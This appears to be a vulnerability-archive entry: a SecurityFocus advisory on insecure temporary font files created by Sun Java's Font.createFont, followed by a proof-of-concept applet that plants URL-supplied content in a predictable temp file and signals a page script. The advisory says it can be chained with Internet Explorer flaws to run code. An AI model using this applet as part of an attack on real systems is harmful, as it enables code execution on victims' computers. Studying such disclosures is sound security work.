@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/10685/info
+
+Sun Java Virtual Machine is a component of the Sun Java infrastructure that performs the handling of Java applets and other programs. It is available for Unix, Linux, and Microsoft platforms. 
+
+Sun Java Virtual Machine is prone to an insecure temporary file creation weakness. It is reported that this file is created by the 'Font.createFont' method with the following name:
+
++~JFxxxxx.tmp
+
+where xxxxx is a random number.
+
+This issue can be combined with various other vulnerabilities in Internet Explorer to ultimately allow for code execution on a vulnerable computer.
+
+import java.applet.Applet;
+
+import java.awt.Font;
+
+import java.net.URL;
+
+import netscape.javascript.JSObject;
+
+
+
+public class Jelmer extends Applet {
+
+
+
+public void init() {
+
+
+
+try {
+
+Font f = Font.createFont(Font.TRUETYPE_FONT, new
+URL(getParameter("infile")).openStream());
+
+} catch(Exception ignored) {}
+
+
+
+try {
+
+JSObject jsWin = JSObject.getWindow(this);
+
+jsWin.call("doneloading", new Object[]{});
+
+
+
+} catch(Exception e) {
+
+e.printStackTrace();
+
+}
+
+}
+
+}
